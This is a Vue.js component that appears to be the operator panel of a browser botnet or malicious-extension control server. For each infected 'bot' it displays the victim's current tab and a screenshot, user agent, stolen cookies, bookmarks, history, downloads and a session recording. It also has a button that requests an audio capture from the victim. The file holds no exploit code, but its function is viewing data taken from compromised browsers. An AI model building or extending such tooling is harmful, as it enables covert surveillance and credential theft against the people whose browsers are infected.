<template>
  <div v-if="info">
    <b-modal
      id="bot_options_modal"
      title="Bot Options & Info"
      ok-only
      ok-variant="secondary"
      ok-title="Close"
      size="xl"
      lazy
      scrollable
      @hidden="reset_options_modal"
    >
      <p v-if="info.current_tab">
        <a :href="info.current_tab.url" target="”_blank”"
          >{{ info.current_tab.title }}
        </a>
      </p>
      <p>
        <b-img-lazy
          center
          thumbnail
          fluid
          :src="info.current_tab_image"
          width="800"
          height="450"
        ></b-img-lazy>
      </p>
      <p>
        This bot has a User-Agent of
        <code>{{ info.user_agent }}</code> and was first seen
        {{ info.createdAt | moment("MMMM Do YYYY, h:mm:ss a") }}.
      </p>

      <p>
        Bot UUID is <code>{{ info.id }}</code>
      </p>
      <p>
        <b-button-group v-if="info">
          <b-button
            variant="success"
            v-if="info.tabs"
            v-on:click="tabs_tab_show = !tabs_tab_show"
            v-b-toggle.sidebar-tabs
            >Tabs[{{ info.tabs }}]</b-button
          >
          <b-button
            variant="warning"
            v-if="info.history"
            v-on:click="history_tab_show = !history_tab_show"
            v-b-toggle.sidebar-history
            >History[{{ info.history }}]</b-button
          >
          <b-button variant="info" v-on:click="get_mp3">Audio</b-button>
        </b-button-group>
      </p>

      <DataTabs :show="tabs_tab_show" :id="info.id" />
      <DataHistory :show="history_tab_show" :id="info.id" />
      <b-tabs lazy>
        <b-tab title="Cookies">
          <DataCookies :id="info.id" />
        </b-tab>
        <b-tab title="BookMarks" :lazy="false">
          <DataBookMarks :id="info.id" />
        </b-tab>
        <b-tab title="Recording">
          <DataRecording :id="info.id" />
        </b-tab>
        <b-tab title="Downloads">
          <DataDownloads :id="info.id" />
        </b-tab>
        <b-tab title="Browser" :lazy="false">
          <DataBrowser :id="info.id" :ua="info.user_agent" />
        </b-tab>
        <b-tab title="Config">
          <DataConfig :id="info.id" :name="info.name" :refresh="refresh" />
        </b-tab>
      </b-tabs>
    </b-modal>
  </div>
</template>

<script>
import { api_file_request } from "./utils.js";
import DataTabs from "@/components/DataTabs.vue";
import DataHistory from "@/components/DataHistory.vue";
import DataCookies from "@/components/DataCookies.vue";
import DataBookMarks from "@/components/DataBookMarks.vue";
import DataDownloads from "@/components/DataDownloads.vue";
import DataBrowser from "@/components/DataBrowser.vue";
import DataRecording from "@/components/DataRecording.vue";
import DataConfig from "@/components/DataConfig.vue";
export default {
  name: "BasicBoard",
  props: {
    info: {
      type: Object,
      required: true,
    },
    refresh: {
      type: Function,
      required: true,
    },
  },
  components: {
    DataTabs,
    DataHistory,
    DataCookies,
    DataBookMarks,
    DataDownloads,
    DataBrowser,
    DataRecording,
    DataConfig,
  },

  data() {
    return {
      tabs_tab_show: false,
      history_tab_show: false,
    };
  },
  methods: {
    reset_options_modal() {
      this.tabs_tab_show = false;
      this.history_tab_show = false;
    },
    async get_mp3() {
      await api_file_request("POST", "/mp3", {
        bot_id: this.info.id,
      });
    },
  },
};
</script>
